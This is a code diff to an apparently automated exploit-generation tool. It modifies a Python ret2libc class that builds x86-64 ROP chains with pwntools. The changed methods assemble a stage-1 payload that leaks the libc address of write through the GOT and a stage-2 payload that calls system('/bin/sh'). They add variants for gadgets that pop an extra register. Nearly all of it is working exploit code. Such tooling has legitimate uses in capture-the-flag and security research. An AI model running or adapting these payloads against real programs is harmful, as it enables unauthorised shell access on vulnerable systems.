@@ -232,7 +232,18 @@ class Ret2LibcWriteX64(ExploitPrimitive):
         return 2
 
     def build_payload(self, ctx: ExploitContext) -> bytes:
-        """Build the stage-1 leak payload (``write(1, write@GOT, n)``)."""
+        """Build the stage-1 leak payload (``write(1, write@GOT, n)``).
+
+        Mirrors v3.1 ``_legacy.ret2libc_write_x64`` 3-variant cascade
+        (P6.4b fix, B-007): the pop chain layout depends on whether
+        ropper found ``pop rdi; pop <reg>; ret`` (``extra_rdi=1``)
+        and/or ``pop rsi; pop <reg>; ret`` (``extra_rsi=1``).  When
+        the gadget pops an extra register, v3.1 inserts a 0 placeholder
+        in the stack chain to consume that extra slot — without it,
+        the ROP chain goes out of alignment and ``write()`` returns to
+        a garbage address (manifests as ``unpack requires a buffer of
+        8 bytes`` during leak parse — P6.4b regression target).
+        """
         from pwn import asm, flat, p64
 
         if (
@@ -246,20 +257,42 @@ class Ret2LibcWriteX64(ExploitPrimitive):
         if write_plt is None or write_got is None or main_addr is None:
             return b""
 
+        g = ctx.gadgets_x64
+        if g.extra_rsi == 1:
+            # v3.1 L927-937: pop rsi; pop <reg>; ret → 0 placeholder after write_got
+            return flat(
+                asm("nop") * ctx.padding
+                + p64(g.pop_rdi) + p64(1)
+                + p64(g.pop_rsi) + p64(write_got) + p64(0)  # 0 placeholder
+                + p64(write_plt) + p64(main_addr)
+            )
+        if g.extra_rdi == 1:
+            # v3.1 L938-948: pop rdi; pop <reg>; ret → 0 placeholder after fd
+            return flat(
+                asm("nop") * ctx.padding
+                + p64(g.pop_rdi) + p64(1) + p64(0)  # 0 placeholder
+                + p64(g.pop_rsi) + p64(write_got)
+                + p64(write_plt) + p64(main_addr)
+            )
+        # v3.1 L949-958: both extra == 0 → 5-arg pop chain
         return flat(
             asm("nop") * ctx.padding
-            + p64(ctx.gadgets_x64.pop_rdi)
-            + p64(1)  # fd = stdout
-            + p64(ctx.gadgets_x64.pop_rsi)
-            + p64(write_got)
-            + p64(write_plt)
-            + p64(main_addr)
+            + p64(g.pop_rdi) + p64(1)
+            + p64(g.pop_rsi) + p64(write_got)
+            + p64(write_plt) + p64(main_addr)
         )
 
     def build_stage2_payload(
         self, ctx: ExploitContext, leaked_write_addr: int,
     ) -> bytes:
-        """Build the stage-2 final payload (``system('/bin/sh')``)."""
+        """Build the stage-2 final payload (``system('/bin/sh')``).
+
+        Mirrors v3.1 ``_legacy.ret2libc_write_x64`` L983-996 2-variant
+        cascade (P6.4b fix, B-007).  The stage-2 pop chain is also
+        affected by ``extra_rdi`` because the stage-2 ret uses
+        ``pop rdi; sh; ret; system`` — when ``pop rdi; pop <reg>; ret``,
+        v3.1 inserts a 0 placeholder to consume the extra slot.
+        """
         from pwn import asm, flat, p64
 
         if (
@@ -281,12 +314,20 @@ class Ret2LibcWriteX64(ExploitPrimitive):
         except (KeyError, AttributeError, StopIteration):
             return b""
 
-        # Include the ``ret`` alignment gadget (P6.2 fix; v3.1 lacked it)
+        g = ctx.gadgets_x64
+        if g.extra_rdi == 1:
+            # v3.1 L983-996: extra_rdi=1 → 0 placeholder between sh and ret
+            return flat(
+                asm("nop") * ctx.padding
+                + p64(g.pop_rdi) + p64(sh_addr) + p64(0)  # 0 placeholder
+                + p64(g.ret)  # stack-alignment gadget
+                + p64(system_addr)
+            )
+        # both extra == 0 OR extra_rsi=1 (stage 2 doesn't use pop_rsi)
         return flat(
             asm("nop") * ctx.padding
-            + p64(ctx.gadgets_x64.pop_rdi)
-            + p64(sh_addr)
-            + p64(ctx.gadgets_x64.ret)  # stack-alignment gadget
+            + p64(g.pop_rdi) + p64(sh_addr)
+            + p64(g.ret)  # stack-alignment gadget
             + p64(system_addr)
         )
 
